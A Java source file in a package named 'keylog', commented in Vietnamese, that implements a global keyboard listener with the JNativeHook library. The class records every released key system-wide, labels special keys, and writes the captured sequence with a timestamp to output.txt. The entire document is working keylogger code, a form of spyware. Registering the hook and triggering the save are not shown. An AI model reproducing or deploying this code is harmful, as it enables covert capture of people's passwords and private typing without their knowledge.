package keylog;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.PrintWriter;
import java.io.UnsupportedEncodingException;
import java.util.Date;

public class NativeKeyboard implements NativeKeyListener {
	public static String KeySequence ="";
	
	public void SaveFile() {
		File f = new File("output.txt");
		//Try catch to open a file to write
		try (PrintWriter output = new PrintWriter(f, "UTF-8")){
			output.write("Du lieu log luc :"+ new Date().toString() + "\n");
			output.write(KeySequence);
			output.write("\n --- HET DU LIEU ---");
			KeySequence="";
		}
		catch (FileNotFoundException | UnsupportedEncodingException e) {
			// TODO: handle exception
			e.printStackTrace();
		}
	}
	@Override
	public void nativeKeyReleased(NativeKeyEvent e) {
		// TODO Auto-generated method stub
		//Lay ra keycode cua phim duoc nhan
		String keyPressed = NativeKeyEvent.getKeyText(e.getKeyCode());
		
		//Truong hop cac dau dac biet tren ban phim (co ten rieng) va khong phai khoang trang
		if (keyPressed.length() > 1 && !keyPressed.equals("Space")) {
			KeySequence = KeySequence + "\n Special Key Pressed: " + keyPressed + "\n";
		}
		//Truong hop gap space thi them 1 dau cach
		else if (keyPressed.equals("Space")) {
			KeySequence += " ";
		}
		//Neu khong roi vao truong hop dac biet thi + vao chuoi Key
		else {
			KeySequence += keyPressed;
		}
	}
	@Override
	public void nativeKeyTyped(NativeKeyEvent arg0) {
		// TODO Auto-generated method stub
		
	}
	@Override
	public void nativeKeyPressed(NativeKeyEvent arg0) {
		// TODO Auto-generated method stub
		
	}
}
